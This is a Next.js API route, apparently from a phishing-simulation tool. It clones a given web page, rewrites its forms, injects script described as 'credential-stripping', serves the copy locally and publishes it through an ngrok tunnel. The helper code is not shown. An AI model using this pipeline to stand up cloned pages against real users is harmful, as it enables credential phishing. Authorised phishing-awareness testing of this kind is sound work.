import { NextRequest, NextResponse } from "next/server";
import { capturePage } from "@/lib/capture/singlefile";
import { modifyHtml } from "@/lib/capture/html-modifier";
import { startLandingServer } from "@/lib/landing-server";
import { startTunnel } from "@/lib/tunnel/ngrok";
import { v4 as uuid } from "uuid";

export async function POST(req: NextRequest) {
  try {
    const { url, campaignId } = await req.json();

    if (!url) {
      return NextResponse.json({ error: "URL is required" }, { status: 400 });
    }

    const appUrl = process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000";
    const filename = `${campaignId || uuid()}.html`;

    // Step 1: Capture the page with SingleFile
    const htmlPath = await capturePage(url, filename);

    // Step 2: Modify HTML (rewrite forms, inject credential-stripping JS)
    await modifyHtml(htmlPath, appUrl);

    // Step 3: Start isolated Express server
    const { port } = await startLandingServer(htmlPath, appUrl);

    // Step 4: Expose via ngrok tunnel
    const ngrokUrl = await startTunnel(port);

    return NextResponse.json({
      htmlPath,
      ngrokUrl,
      port,
    });
  } catch (error) {
    console.error("Capture failed:", error);
    return NextResponse.json(
      { error: (error as Error).message },
      { status: 500 }
    );
  }
}
